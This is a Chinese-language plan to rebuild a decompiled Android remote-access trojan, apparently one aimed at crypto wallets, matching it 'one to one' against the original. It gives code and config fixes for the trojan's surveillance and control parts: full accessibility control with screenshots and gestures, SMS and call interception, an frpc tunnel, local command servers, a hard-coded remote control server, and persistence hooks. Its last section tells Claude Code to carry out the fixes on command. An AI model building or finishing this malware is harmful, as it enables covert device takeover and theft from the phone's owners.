# 一比一复刻修复计划 — 基于真机深度对比

> 代码对齐 + 功能验证 + 真机通过
> 所有修复均基于 vendor 源码审查，不猜测实现

---

## Vendor 源码审查结果

### MainApplication.init() 完整调用链 (vendor 行 278-397)

```
init() {
  // 1. 创建缓存目录 (PCM/WAV)
  // 2. new HandlerMsgAndTimer()                    → thread.e (Timer, 10s 调度消息队列)
  // 3. new StrategyThread()                        → thread.j (策略事件队列)
  // 4. new JobSchedulerManage()                    → a0.c
  //    → startService(WIFIBackgroundService)       → 普通 Service
  //    → JobScheduler.schedule(job 116)            → wifi-lock-server, 5s latency, network required
  // 5. 注册 10 个 Receiver (g.W0~g.m1):
  //    W0 → AlarmReceiver
  //    k1 → ScreenBroadcastReceiver
  //    c1 → BootBroadcast
  //    l1 → ShutDownBroadcastReceiver
  //    b1 → BatteryLevelReceiver
  //    j1 → PowerBroadcastReceiver
  //    h1 → NetWorkReceiver
  //    i1 → PackageReceiver
  //    m1 → SmsReceiver
  //    e1 → CallReceiver
  // 6. 注册 LocaleChangeReceiver
  // 7. new HttpCommandServer (server.b) → W2() 启动 asyncHttpServer
  // 8. server.c.H() → 启动 MyWebSocketServer (端口 7900/7980)
  // 9. new SmsMessageListener
  // 10. unlockedInstance() → 见下方
  // 11. new ConfigFileDeleteObserver → 监控 frpc.ini/listenWindows.json 删除
  // 12. new CrackLockCipherPlug
}
```

### unlockedInstance() 完整调用链 (vendor 行 829-908)

```
unlockedInstance() {
  // 前置: h.s() 检查用户解锁状态
  // 1. buildConfig = d.a()                         → 同步加载 config
  // 2. new CheckProcessThread (thread.b) → g()     → 启动 frpc 进程管理
  // 3. new HeartThread (thread.f)                  → Timer 10s 间隔
  //    → fVar.f256d.schedule(fVar, 10000L, 10000L)
  // 4. h.p()                                       → Hidden API bypass
  // 5. HTTP: shareADBConfig                        → http://127.0.0.1:7911/shareADBConfig
  // 6. http.l.z()                                  → /api/device/updateDeviceInfo.json
  // 7. 注册 6 个 ContentObserver:
  //    → development_settings_enabled
  //    → adb_enabled
  //    → adb_wifi_enabled
  //    → MediaStore.Images (photo)
  //    → MediaStore.Video (video)
  //    → MediaStore.Audio (audio)
}
```

### Vendor 线程类映射

| Vendor 混淆名 | 行数 | Replica 文件 | 职责 |
|--------------|------|-------------|------|
| thread.e | 147 | keepalive/thread/MessageQueueManager.java | 消息队列 Timer (10s 调度) |
| thread.f | 293 | keepalive/thread/KeepHeartThread.java | 心跳 TimerTask (10s 间隔) |
| thread.b | 208 | keepalive/thread/CheckProcessThread.java | frpc 进程管理 |
| thread.j | 220 | keepalive/thread/StrategyThread.java | 策略事件队列 |

### Vendor 服务器类映射

| Vendor 混淆名 | 行数 | Replica 文件 | 职责 |
|--------------|------|-------------|------|
| server.b | 11172 | control/server/HttpCommandServer.java | HTTP 命令服务器 (端口 7910/7911/7912) |
| server.c | 146 | control/server/LocalWebSocketServer.java | WebSocket 服务器 (端口 7900/7980) |

### Vendor 无障碍配置 (从 dumpsys 提取)

```
eventTypes: TYPE_VIEW_CLICKED, TYPE_VIEW_LONG_CLICKED, TYPE_VIEW_SELECTED,
            TYPE_VIEW_FOCUSED, TYPE_VIEW_TEXT_CHANGED, TYPE_WINDOW_STATE_CHANGED,
            TYPE_WINDOW_CONTENT_CHANGED, TYPE_VIEW_SCROLLED,
            TYPE_VIEW_TEXT_SELECTION_CHANGED, TYPE_ANNOUNCEMENT,
            TYPE_VIEW_CONTEXT_CLICKED
feedbackType: SPOKEN|HAPTIC|AUDIBLE|VISUAL|GENERIC|BRAILLE + 更多
notificationTimeout: 50
flags: INCLUDE_NOT_IMPORTANT_VIEWS, REQUEST_TOUCH_EXPLORATION,
       REQUEST_ENHANCED_WEB_ACCESSIBILITY, REPORT_VIEW_IDS,
       RETRIEVE_INTERACTIVE_WINDOWS
capabilities: CAN_RETRIEVE_WINDOW_CONTENT, CAN_PERFORM_GESTURES, CAN_TAKE_SCREENSHOT
```

---

## 修复任务清单 (15 项, 按依赖顺序)

### FIX-01: accessibility_service_config.xml 对齐 [P1-HIGH]

差异项: #5 #6 #7 #8 #9
Vendor 源码: dumpsys accessibility ServiceInfo (真机提取)
Replica 文件: `android/app/src/main/res/xml/accessibility_service_config.xml`

Vendor 实际配置:
```
eventTypes: 11 种精确选择 (非 typeAllMask)
feedbackType: feedbackAllMask (SPOKEN|HAPTIC|AUDIBLE|VISUAL|GENERIC|BRAILLE)
notificationTimeout: 50
flags: flagIncludeNotImportantViews|flagRequestTouchExplorationMode|
       flagRequestEnhancedWebAccessibility|flagReportViewIds|
       flagRetrieveInteractiveWindows
capabilities: canRetrieveWindowContent + canPerformGestures + canTakeScreenshot
```

Replica 当前:
```xml
android:accessibilityEventTypes="typeAllMask"
android:accessibilityFeedbackType="feedbackGeneric"
android:notificationTimeout="100"
android:accessibilityFlags="flagDefault|flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
android:canRetrieveWindowContent="true"
android:canPerformGestures="true"
<!-- 缺少 canTakeScreenshot -->
```

修复:
```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewClicked|typeViewLongClicked|typeViewSelected|typeViewFocused|typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged|typeViewScrolled|typeViewTextSelectionChanged|typeAnnouncement|typeViewContextClicked"
    android:accessibilityFeedbackType="feedbackAllMask"
    android:accessibilityFlags="flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility|flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canRetrieveWindowContent="true"
    android:canPerformGestures="true"
    android:canTakeScreenshot="true"
    android:description="@string/accessibility_service_description"
    android:notificationTimeout="50" />
```

验证:
```bash
$ADB -s $DEVICE shell dumpsys accessibility | grep -A5 "com.vendor.rat"
# 确认 feedbackType/flags/capabilities/eventTypes/notificationTimeout 与 vendor 一致
```

---

### FIX-02: network_security_config.xml 创建 [P2-MEDIUM]

差异项: #1
Vendor 源码: MainApplication.java 行 821 `NetworkSecurityConfig: Using Network Security Config from resource`
Vendor APK manifest: 引用了 `@xml/network_security_config` (从 logcat 确认)

Replica 当前: 无此文件
新建文件: `android/app/src/main/res/xml/network_security_config.xml`

Vendor 行为 (从日志推断): 允许明文流量到本地 + 信任系统证书

修复:
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">127.0.0.1</domain>
        <domain includeSubdomains="true">localhost</domain>
    </domain-config>
</network-security-config>
```

AndroidManifest.xml 添加引用:
```xml
<application
    ...
    android:networkSecurityConfig="@xml/network_security_config"
    ...>
```

验证:
```bash
# logcat 应显示 "Using Network Security Config from resource"
$ADB -s $DEVICE logcat -d | grep "NetworkSecurityConfig"
```

---

### FIX-03: MainApplication.init() 补全 — HandlerMsgAndTimer [P0-CRITICAL]

差异项: #11
Vendor 源码: MainApplication.java 行 305-307

```java
// vendor 原始代码:
if (this.handlerMsgAndTimer == null) {
    this.handlerMsgAndTimer = new e();  // thread.e = MessageQueueManager
}
```

Vendor thread.e 构造函数 (thread/e.java 行 28-37):
```java
public e() {
    Timer timer = new Timer();
    this.f250a = timer;
    this.b = false;
    this.c = Long.valueOf(new Date().getTime());
    this.f251d = "";
    this.f252e = new ConcurrentLinkedQueue();  // 事件消息队列
    this.f253f = new ConcurrentLinkedQueue();  // 同步消息队列
    timer.schedule(new d(this, 0), 10000L, 10000L);  // 10s 间隔调度
}
```

Replica 文件: `keepalive/thread/MessageQueueManager.java`
修复: 在 MainApplication.initInternal() 或 unlockedInstance() 中创建并启动 MessageQueueManager

---

### FIX-04: MainApplication.init() 补全 — StrategyThread [P2-MEDIUM]

差异项: (保活相关)
Vendor 源码: MainApplication.java 行 308-314

```java
// vendor 原始代码:
if (j.f267g == null) {
    synchronized (j.class) {
        if (j.f267g == null) {
            j.f267g = new j();  // thread.j = StrategyThread
        }
    }
}
```

Replica 文件: `keepalive/thread/StrategyThread.java`
修复: 在 MainApplication.unlockedInstance() 中创建 StrategyThread 单例

---

### FIX-05: MainApplication.init() 补全 — JobScheduler + WIFIBackgroundService [P2-MEDIUM]

差异项: #12 #13
Vendor 源码: MainApplication.java 行 315-340

```java
// vendor 原始代码:
if (this.jobSchedulerManage == null) {
    Context context2 = context;
    a0.c cVar = new a0.c(context2);
    this.jobSchedulerManage = cVar;
    JobScheduler jobScheduler = cVar.f2a;
    if (jobScheduler.getPendingJob(116) == null) {
        try {
            context2.startService(new Intent(context2, WIFIBackgroundService.class));
            JobInfo.Builder builder = new JobInfo.Builder(116,
                new ComponentName(context2, WIFIBackgroundService.class));
            builder.setPersisted(true);
            builder.setRequiresCharging(false);
            builder.setRequiresDeviceIdle(false);
            builder.setBackoffCriteria(5000L, 0);
            builder.setMinimumLatency(5000L);
            builder.setRequiredNetworkType(1);  // NETWORK_TYPE_ANY
            builder.setTriggerContentMaxDelay(5000L);
            jobScheduler.schedule(builder.build());
        } catch (Exception e2) { ... }
    }
}
```

Replica 文件: `keepalive/KeepAliveManager.java` (需添加 JobScheduler 逻辑)
修复: 在 MainApplication.init() 中启动 WIFIBackgroundService + 注册 JobScheduler job 116

---

### FIX-06: MainApplication.init() 补全 — Receiver 注册补齐 [P2-MEDIUM]

差异项: #2
Vendor 源码: MainApplication.java 行 341-364, utils/g.java 行 1063+

Vendor 注册 10 个 Receiver + 1 个 LocaleChangeReceiver = 11 个
Replica 当前 KeepAliveManager 注册 6 个: Battery, Power, ShutDown, NetWork, Alarm, Locale

缺失:
- ScreenBroadcastReceiver (g.k1) — 已在 DataCollectionManager 中注册 ✅
- BootBroadcast (g.c1) — 缺失
- PackageReceiver (g.i1) — 缺失
- SmsReceiver (g.m1) — 缺失 (需 SMS 权限)
- CallReceiver (g.e1) — 缺失 (需 CALL_LOG 权限)

修复: 在 KeepAliveManager.init() 中补齐 BootBroadcast + PackageReceiver 注册

---

### FIX-07: MainApplication.init() 补全 — HttpCommandServer 启动 [P0-CRITICAL]

差异项: #3 #14
Vendor 源码: MainApplication.java 行 365-372

```java
// vendor 原始代码:
if (com.guard.wallet.server.b.b == null) {
    synchronized (com.guard.wallet.server.b.class) {
        if (com.guard.wallet.server.b.b == null) {
            com.guard.wallet.server.b.b = new com.guard.wallet.server.b();
        }
    }
}
com.guard.wallet.server.b.b.W2();  // 启动 asyncHttpServer
```

Vendor server.b.W2() 启动 HTTP 服务器监听端口 7910/7911/7912
日志: `HttpServer: asyncHttpServer 已启动`

Replica 文件: `control/server/HttpCommandServer.java` (已有 22159 行实现)
修复: 在 MainApplication.unlockedInstance() 中调用 HttpCommandServer 的启动方法

---

### FIX-08: MainApplication.init() 补全 — LocalWebSocketServer 启动 [P0-CRITICAL]

差异项: #4
Vendor 源码: MainApplication.java 行 373

```java
// vendor 原始代码:
com.guard.wallet.server.c.H();  // 静态方法启动 WebSocket Server
```

Vendor server.c.H() (server/c.java 行 52-71):
```java
public static void H() {
    c G = G();                    // 获取/创建单例 (端口 7900, 备选 7980)
    G.f317g = true;               // setDaemon
    // ... 设置 daemon threads
    Thread thread = new Thread(G2);
    thread.setDaemon(true);
    thread.start();
    Log.d("MyWebSocketServer", "webSocketServer start");
}
```

Replica 文件: `control/server/LocalWebSocketServer.java` (已有 4200 行实现)
修复: 在 MainApplication.unlockedInstance() 中调用 LocalWebSocketServer 的启动方法

---

### FIX-09: unlockedInstance() 补全 — CheckProcessThread 启动 [P1-HIGH]

差异项: #10
Vendor 源码: MainApplication.java 行 836-839

```java
// vendor 原始代码:
if (this.checkThread == null) {
    b bVar = new b();          // thread.b = CheckProcessThread
    this.checkThread = bVar;
    bVar.g();                  // 启动 (Timer 调度)
}
```

Replica 文件: `keepalive/thread/CheckProcessThread.java` (已有 4102 行实现)
修复: 在 MainApplication.unlockedInstance() 中创建并启动 CheckProcessThread

---

### FIX-10: unlockedInstance() 补全 — KeepHeartThread 启动 [P0-CRITICAL]

差异项: #9
Vendor 源码: MainApplication.java 行 841-845

```java
// vendor 原始代码:
if (this.heartThread == null) {
    f fVar = new f();          // thread.f = KeepHeartThread (extends TimerTask)
    this.heartThread = fVar;
    fVar.f256d.schedule(fVar, 10000L, 10000L);  // 10s 延迟, 10s 间隔
}
```

Replica 文件: `keepalive/thread/KeepHeartThread.java` (已有 3750 行实现)
修复: 在 MainApplication.unlockedInstance() 中创建 KeepHeartThread 并用 Timer 调度 (10s, 10s)

---

### FIX-11: unlockedInstance() 补全 — 初始 API 请求 [P1-HIGH]

差异项: #6 #15
Vendor 源码: MainApplication.java 行 848-850

```java
// vendor 原始代码:
String str = com.guard.wallet.http.l.f179a;  // 服务器地址
new i("http://127.0.0.1:7911").d(null, "/shareADBConfig", new y());  // 本地 HTTP
com.guard.wallet.http.l.z();  // → /api/device/updateDeviceInfo.json
```

Vendor http.l.z() (http/l.java 行 365-374):
```java
public static void z() {
    String l2 = h.l("deviceId");
    if (q.B(l2)) return;
    DeviceUpdateVO of = DeviceUpdateVO.of();
    of.setDeviceId(l2);
    new i().h(of, "/api/device/updateDeviceInfo.json", new g());
}
```

其他初始 API (从 KeepHeartThread.run 中触发):
```
/api/device/register.json          → 设备注册
/api/agent/query.json              → 查询代理配置
/api/locateValue/entryAppMap.json  → 应用定位映射
/api/listen/windows.json           → 监听窗口配置
/api/containerApi/getCacheTask     → 缓存任务
```

修复: 在 unlockedInstance() 中调用 updateDeviceInfo API，KeepHeartThread 中触发其余 API

---

### FIX-12: unlockedInstance() 补全 — ContentObserver 注册 [P2-MEDIUM]

差异项: (保活相关)
Vendor 源码: MainApplication.java 行 851-898

Vendor 注册 6 个 ContentObserver:
```
1. development_settings_enabled  → Settings.Global
2. adb_enabled                   → Settings.Global
3. adb_wifi_enabled              → Settings.Global
4. MediaStore.Images             → photo 变化
5. MediaStore.Video              → video 变化
6. MediaStore.Audio              → audio 变化
```

修复: 在 unlockedInstance() 中注册这 6 个 ContentObserver

---

### FIX-13: WebSocket URL 配置 [P1-HIGH]

差异项: #5
真机日志: `WebSocketClient: WebSocket URL is null, skipping connect`

Vendor 行为: WebSocket 客户端连接到远程服务器 (165.154.203.196:443)
Replica 问题: config.json 中 wsUrl 字段为 null

修复: 检查 `android/app/src/main/assets/config.json` 中的 wsUrl 字段，确保有值

---

### FIX-14: listenWindows.json 加载机制 [P1-HIGH]

差异项: #7
Vendor 源码: MyAccessibilityService (从日志确认)

```
MyAccessibilityService: /storage/emulated/0/Android/data/org.ldtape.qqlhl/files/listenWindows.json
MyAccessibilityService: 准备添加本地监听窗口:[{...}]
MyAccessibilityService: 已添加本地监听窗口
```

Vendor 流程:
1. 从 API `/api/listen/windows.json` 下载配置
2. 保存到 `<externalFilesDir>/listenWindows.json`
3. MyAccessibilityService.onServiceConnected 时从本地文件加载
4. ConfigFileDeleteObserver 监控文件删除 → 重新下载

修复: 在 MyAccessibilityService.onServiceConnected() 中添加 listenWindows.json 加载逻辑

---

### FIX-15: ConfigFileDeleteObserver [P2-MEDIUM]

差异项: (保活相关)
Vendor 源码: MainApplication.java 行 382-386

```java
// vendor 原始代码:
if (this.configFileDeleteObserver == null) {
    y.b bVar2 = new y.b(g.i0(), new j.e(26));
    this.configFileDeleteObserver = bVar2;
    bVar2.startWatching();  // FileObserver 监控文件删除
}
```

监控文件: frpc.ini, listenWindows.json, locateValues.json, private.key, cert.pem

修复: 创建 ConfigFileDeleteObserver 类，在 MainApplication.init() 末尾启动

---

## 修复执行顺序

```
Phase 1: 配置文件对齐 (不改 Java 代码)
  FIX-01: accessibility_service_config.xml
  FIX-02: network_security_config.xml + Manifest 引用
  FIX-13: config.json wsUrl 字段
  → ./gradlew assembleDebug → 真机验证配置

Phase 2: MainApplication.init() 补全 (核心)
  FIX-03: HandlerMsgAndTimer (MessageQueueManager)
  FIX-04: StrategyThread
  FIX-05: JobScheduler + WIFIBackgroundService
  FIX-06: Receiver 注册补齐
  FIX-07: HttpCommandServer 启动
  FIX-08: LocalWebSocketServer 启动
  → ./gradlew compileDebugJavaWithJavac → 编译检查

Phase 3: unlockedInstance() 补全
  FIX-09: CheckProcessThread 启动
  FIX-10: KeepHeartThread 启动
  FIX-11: 初始 API 请求
  FIX-12: ContentObserver 注册
  → ./gradlew test → JVM 测试

Phase 4: 无障碍增强
  FIX-14: listenWindows.json 加载
  FIX-15: ConfigFileDeleteObserver
  → ./gradlew assembleDebug → 真机验证全部

Phase 5: 真机深度对比验证
  → 按 COMPARISON_REPORT.md Round A/B/C 流程重新执行
  → 生成新的 COMPARISON_RESULT_v2.md
  → 逐项确认 15 个差异全部消除
```

---

## 验证标准

每个 FIX 完成后必须通过:

1. ☐ 编译通过: `./gradlew compileDebugJavaWithJavac`
2. ☐ JVM 测试通过: `./gradlew test`
3. ☐ APK 构建成功: `./gradlew assembleDebug`

全部 FIX 完成后:

4. ☐ 真机安装成功
5. ☐ 手动授权无障碍
6. ☐ 按 Round A/B/C 流程重新执行深度对比
7. ☐ 15 个差异项全部 PASS
8. ☐ 零 FATAL EXCEPTION
9. ☐ 零 ANR

---

## Claude Code 执行指令

当用户说 **"执行修复 FIX-XX"** 时:

```
1. 读取本文档中 FIX-XX 的 vendor 源码和修复方案
2. 读取 replica 当前文件
3. 对齐 vendor 实现编写修复代码
4. 编译检查: ./gradlew compileDebugJavaWithJavac
5. JVM 测试: ./gradlew test
6. 标记 FIX-XX 完成
```

当用户说 **"执行全部修复"** 时:

```
按 Phase 1 → Phase 5 顺序执行全部 15 个 FIX
```
